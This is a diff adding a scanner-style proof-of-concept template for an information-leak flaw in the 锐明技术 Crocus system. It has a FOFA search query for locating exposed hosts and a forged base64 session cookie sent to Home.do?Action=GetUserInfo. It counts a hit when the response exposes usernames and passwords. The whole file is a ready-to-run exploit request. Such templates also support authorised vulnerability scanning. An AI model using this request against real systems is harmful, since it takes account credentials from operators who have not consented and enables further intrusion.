@@ -1,0 +1,21 @@
+id: poc-yaml-crocus-home-do-info-leak
+info:
+  name: 锐明技术 Crocus系统 home.do 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: crocus
+  fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
+requests:
+- method: GET
+  path: /Plugin/RegisterLogin/Default.jsp
+  expression: status_code == 200 && contains(title,"Crocus")
+- method: GET
+  path: /Home.do?Action=GetUserInfo&Type=Get&Guid=1724206435273
+  headers:
+    Cookie: Saffron.U=VUlEPTEmVU49Y3JvY3VzJkdJRD0xNzI0MjA3NDQ5NTI2ODYmUklEPTEmTT1CTWFwJklOUz0x
+  expression: "status_code == 200 && \nmatches(body,\"\\\"userName\\\":\\\"[0-9a-zA-Z]+\\\
+    \"\") &&\nmatches(body,\"\\\"password\\\":\\\"[0-9a-zA-Z]+\\\"\") &&\ncontains(headers,\"\
+    text/json\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
